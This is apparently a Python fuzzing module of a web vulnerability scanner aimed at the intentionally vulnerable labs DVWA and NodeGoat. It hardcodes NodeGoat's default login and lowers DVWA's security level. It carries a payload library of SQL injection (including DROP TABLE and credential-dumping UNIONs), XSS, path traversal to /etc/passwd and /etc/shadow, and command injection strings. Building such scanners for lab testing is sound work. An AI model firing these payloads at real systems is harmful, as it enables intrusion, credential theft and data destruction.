import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin

from scanner_http import build_session, dvwa_login


# NodeGoat default seeded account (created by its own db-reset).
NODEGOAT_USER = "user1"
NODEGOAT_PASS = "User1_123"

# Fuzzing is the dominant cost of a scan, so requests run concurrently.
# Every worker thread gets its own authenticated session because a
# requests.Session cannot safely be shared between threads.
MAX_WORKERS = 6

# A few fields make the target perform a slow third-party lookup (for
# example NodeGoat's stock-symbol lookup, which takes seconds online and
# hits a network timeout when the machine is offline). Such a field gets a
# single wait, not one wait per payload, and no field may exceed its share
# of the scan's time budget.
SLOW_FIELD_BASELINE = 5.0
FIELD_TIME_BUDGET = 8.0


class Fuzzer:
    def __init__(self, base_url, username=None, password=None):
        self.base_url = base_url
        # Same tester-supplied credentials the crawler used, so fuzzing
        # requests are made under the same authenticated identity.
        self.username = username or None
        self.password = password or None
        self._tls = threading.local()
        # Authenticate with whichever target we are pointed at, so the
        # fuzzing session can reach the protected pages.
        self.session = self._new_session()
        self._tls.session = self.session
        self.payloads = self._load_payloads()

    def _new_session(self):
        """Build and authenticate a fresh session for one worker thread."""
        session = build_session()
        if self._is_nodegoat():
            self._login_nodegoat(session)
        else:
            self._login(session)
        return session

    def _session(self):
        """Return this thread's authenticated session."""
        session = getattr(self._tls, 'session', None)
        if session is None:
            session = self._new_session()
            self._tls.session = session
        return session

    def _is_nodegoat(self):
        url = self.base_url.lower()
        return ":4000" in url or ":3000" in url or "nodegoat" in url

    def _login_nodegoat(self, session=None):
        """Authenticate the given session (default: the main one) with NodeGoat."""
        session = session or self.session
        try:
            login_url = urljoin(self.base_url + "/", "login")
            response = session.get(login_url, timeout=10)
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            token_field = soup.find('input', {'name': '_csrf'})
            csrf = token_field.get('value', '') if token_field else ''
            login_data = {
                'userName': self.username or NODEGOAT_USER,
                'password': self.password or NODEGOAT_PASS,
                '_csrf': csrf
            }
            resp = session.post(
                login_url,
                data=login_data,
                timeout=10,
                allow_redirects=False,
                headers={'Referer': login_url}
            )
            location = resp.headers.get('Location', '')
            last = location.rstrip('/').rsplit('/', 1)[-1]
            if resp.status_code in (301, 302, 303, 307, 308) and last != 'login':
                print(f"[+] Fuzzer authenticated to NodeGoat (-> {location})")
            else:
                dash = session.get(
                    urljoin(self.base_url + "/", "dashboard"),
                    timeout=10, allow_redirects=False)
                if dash.status_code == 200:
                    print("[+] Fuzzer authenticated to NodeGoat")
                else:
                    print("[!] WARNING: Fuzzer NodeGoat authentication failed.")
        except Exception as e:
            print(f"[!] Fuzzer NodeGoat login failed: {e}")

    def _login(self, session=None):
        """Authenticate the given session (default: the main one) with DVWA.

        This must log in *and* force the security level to LOW. DVWA keeps
        the security level in a per-session cookie, so the level the crawler
        set does not carry over to this separate session. Without lowering
        it here, the fuzzer runs at DVWA's default ('impossible'), where
        every vulnerability page requires a CSRF token and simply redirects
        the fuzzer's requests -- producing zero findings on a wide-open
        target.
        """
        session = session or self.session
        try:
            if dvwa_login(session, self.base_url,
                          self.username, self.password):
                print("[+] Fuzzer authenticated to DVWA (security=LOW)")
            else:
                print("[!] WARNING: Fuzzer DVWA authentication failed.")
        except Exception as e:
            print(f"[!] Fuzzer login failed: {e}")

    def _load_payloads(self):
        """Context-aware payload library"""
        return {
            'sqli': [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "'; DROP TABLE users; --",
                "' UNION SELECT null, username, password FROM users --",
                "1' AND SLEEP(3) --",
                "' OR 1=1 LIMIT 1 --",
                "admin'--",
                "' OR 'x'='x",
                "1; SELECT * FROM users",
                "' AND 1=2 UNION SELECT 1,2,3 --"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<body onload=alert('XSS')>",
                "'\"><script>alert('XSS')</script>",
                "<iframe src=javascript:alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<<SCRIPT>alert('XSS')<</SCRIPT>",
                "<ScRiPt>alert('XSS')</ScRiPt>"
            ],
            'path_traversal': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "/etc/passwd",
                "../../etc/shadow",
                "../etc/passwd%00",
                "....//....//etc/passwd",
                "%2F%2F%2Fetc%2Fpasswd"
            ],
            'cmd_injection': [
                "-ls",
                "--ls",
                "; ls -la",
                "| ls -la",
                "&& ls -la",
                "& ls -la",
                "; ls",
                "| ls",
                "&& ls",
                "; whoami",
                "| whoami",
                "&& whoami",
                "; id",
                "| id",
                "&& id",
                "&& cat /etc/passwd",
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "`whoami`",
                "$(whoami)",
                "`id`",
                "$(id)",
                "& dir",
                "| dir"
            ]
        }

    def _get_context(self, input_field):
        """Determine appropriate payload type based on input context.
        NOTE: 'name' is intentionally NOT an sqli keyword. DVWA's
        reflected-XSS field is literally called 'name', and NodeGoat's
        profile uses firstName/lastName -- routing those to XSS is what
        lets the scanner catch reflected/stored XSS on both targets."""
        name = input_field.get('name', '').lower()
        input_type = input_field.get('type', 'text').lower()
        if any(k in name for k in ['id', 'user', 'pass', 'search', 'query', 'q']):
            return 'sqli'
        elif any(k in name for k in ['comment', 'message', 'text', 'input', 'content', 'name', 'memo', 'title', 'address']):
            return 'xss'
        elif any(k in name for k in ['file', 'path', 'dir', 'folder', 'page', 'include']):
            return 'path_traversal'
        elif any(k in name for k in ['cmd', 'exec', 'command', 'run', 'ip', 'host']):
            return 'cmd_injection'
        else:
            return 'sqli'  # Default to SQLi for unknown fields

    def fuzz(self, endpoints, on_progress=None):
        """Fuzz all discovered endpoints with context-aware payloads.

        Requests are sent concurrently in bounded batches, which keeps the
        scan inside its time budget. Results are kept in field/payload order
        so reporting stays deterministic.

        ``on_progress`` is an optional callback ``on_progress(detail)`` that
        reports which endpoint is currently being fuzzed, so the UI can show
        live progress through the fuzzing stage.
        """
        all_responses = []
        total = len(endpoints)

        # One pool for the whole scan: its worker threads (and therefore
        # their authenticated sessions) are reused instead of rebuilt.
        with ThreadPoolExecutor(max_workers=MAX_WORKERS + 1) as pool:
            for i, endpoint in enumerate(endpoints):
                endpoint_start = time.time()
                print(f"[*] Fuzzing endpoint {i+1}/{total}: {endpoint['url']}")
                if on_progress:
                    on_progress(
                        f"endpoint {i+1}/{total} — {endpoint['url']}"
                    )

                for input_field in endpoint['inputs']:
                    context = self._get_context(input_field)
                    payloads = self.payloads[context]

                    if on_progress:
                        on_progress(
                            f"endpoint {i+1}/{total} — field "
                            f"'{input_field['name']}' ({context})"
                        )

                    all_responses.extend(
                        self._fuzz_field(
                            pool, endpoint, input_field, context, payloads
                        )
                    )

                print(f"[*] Endpoint {i+1}/{total} done in "
                      f"{time.time() - endpoint_start:.1f}s")

        print(f"[*] Fuzzing complete. {len(all_responses)} responses collected")
        return all_responses

    def _fuzz_field(self, pool, endpoint, input_field, context, payloads):
        """Fuzz one field in concurrent batches, within a time budget.

        The baseline is sent alongside the first batch so a field that makes
        the target wait (a third-party lookup, for example) costs one wait
        rather than two. If that baseline is slow, or the field has used its
        time budget, the remaining payloads are skipped: they would only
        repeat the same wait without adding evidence.
        """
        name = input_field['name']
        field_start = time.time()
        collected = []

        def send(payload):
            return self._send_request(endpoint, input_field, payload, context)

        first = payloads[:MAX_WORKERS]
        rest = list(payloads[MAX_WORKERS:])

        baseline_future = pool.submit(
            self._send_request, endpoint, input_field,
            'normal_input', 'baseline'
        )
        results = list(pool.map(send, first))
        baseline = baseline_future.result()

        for data in results:
            if data:
                data['baseline'] = baseline
                collected.append(data)

        baseline_time = (baseline or {}).get('response_time', 0.0)
        if baseline_time > SLOW_FIELD_BASELINE:
            print(
                f"[*] Field '{name}' baseline took {baseline_time:.1f}s "
                f"(slow target-side lookup); skipping {len(rest)} "
                f"remaining payloads"
            )
            rest = []

        for start in range(0, len(rest), MAX_WORKERS):
            if time.time() - field_start > FIELD_TIME_BUDGET:
                print(
                    f"[*] Field '{name}' reached its "
                    f"{FIELD_TIME_BUDGET:.0f}s budget; skipping "
                    f"{len(rest) - start} remaining payloads"
                )
                break
            chunk = rest[start:start + MAX_WORKERS]
            results = list(pool.map(send, chunk))
            for data in results:
                if data:
                    data['baseline'] = baseline
                    collected.append(data)

        return collected

    def _send_request(self, endpoint, input_field, payload, payload_type):
        """Send a single request and record the response"""
        session = self._session()
        try:
            form_data = {}

            # Always replay the form's submit button and hidden fields
            # (e.g. Submit=Submit, CSRF _csrf/user_token) unmodified.
            for ef in endpoint.get('extra_fields', []):
                form_data[ef['name']] = ef['value']

            for field in endpoint['inputs']:
                if field['name'] == input_field['name']:
                    form_data[field['name']] = payload
                else:
                    form_data[field['name']] = field.get('value', 'test')

            start_time = time.time()

            if endpoint['method'] == 'POST':
                response = session.post(
                    endpoint['url'],
                    data=form_data,
                    timeout=15,
                    allow_redirects=True
                )
            else:
                response = session.get(
                    endpoint['url'],
                    params=form_data,
                    timeout=15,
                    allow_redirects=True
                )

            response_time = time.time() - start_time

            return {
                'url': endpoint['url'],
                'method': endpoint['method'],
                'input_field': input_field['name'],
                'payload': payload,
                'payload_type': payload_type,
                'status_code': response.status_code,
                'response_time': response_time,
                'content_length': len(response.content),
                'response_text': response.text,
                'headers': dict(response.headers)
            }

        except requests.exceptions.Timeout:
            return {
                'url': endpoint['url'],
                'input_field': input_field['name'],
                'payload': payload,
                'payload_type': payload_type,
                'status_code': 0,
                'response_time': 15.0,
                'content_length': 0,
                'response_text': '',
                'headers': {},
                'timeout': True
            }
        except Exception as e:
            print(f"[!] Request error: {e}")
            return None
